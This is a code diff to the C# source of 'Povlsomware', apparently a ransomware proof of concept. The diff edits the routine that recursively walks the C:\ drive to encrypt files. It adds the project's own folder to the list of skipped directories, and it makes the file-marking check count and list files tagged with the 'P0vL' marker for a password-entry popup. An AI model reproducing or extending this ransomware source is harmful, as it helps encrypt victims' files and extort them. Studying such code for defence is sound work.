@@ -15,7 +15,7 @@ namespace Povlsomware
         {
             //Start the attack
             Attack();
-            Console.Write(count);
+
             //Undo the attack
             //Creates a popup that lets you view the encrypted files and add the password
             PayM3 thx = new PayM3();
@@ -88,6 +88,7 @@ namespace Povlsomware
         {
             String startDirectory = "C:\\"; //Where to start from
             ProcessDirectory(startDirectory, 0, password);
+            System.Windows.Forms.Application.Exit();
         }
 
         // Process all files in the directory passed in, recurse on any directories 
@@ -108,7 +109,7 @@ namespace Povlsomware
             foreach (string subdirectory in subdirectoryEntries)
                 try
                 {   //Dont go into windows program files and temporary internet files. And other #ew ugly
-                    if (!subdirectory.Contains("All Users\\Microsoft\\") && !subdirectory.Contains("$Recycle.Bin") && !subdirectory.Contains("C:\\Windows") && !subdirectory.Contains("C:\\Program Files") && !subdirectory.Contains("Temporary Internet Files") && !subdirectory.Contains("AppData\\") && !subdirectory.Contains("\\source\\") && !subdirectory.Contains("C:\\ProgramData\\"))
+                    if (!subdirectory.Contains("All Users\\Microsoft\\") && !subdirectory.Contains("$Recycle.Bin") && !subdirectory.Contains("C:\\Windows") && !subdirectory.Contains("C:\\Program Files") && !subdirectory.Contains("Temporary Internet Files") && !subdirectory.Contains("AppData\\") && !subdirectory.Contains("\\source\\") && !subdirectory.Contains("C:\\ProgramData\\") && !subdirectory.Contains("\\Povlsomware-master\\"))
                     {
                         ProcessDirectory(subdirectory, action, password);
                     }
@@ -118,12 +119,15 @@ namespace Povlsomware
                 }
         }
 
-        public static Boolean isMarked(string fileName)
+
+        public static bool isMarked(string fileName)
         {
             byte[] mark = Encoding.ASCII.GetBytes("P0vL");
             byte[] firstFourBytes = File.ReadAllBytes(fileName).Take(4).ToArray();
             if (mark.SequenceEqual(firstFourBytes))
             {
+                count++;
+                myFiles.Add(fileName);
                 return true;
             }
             return false;
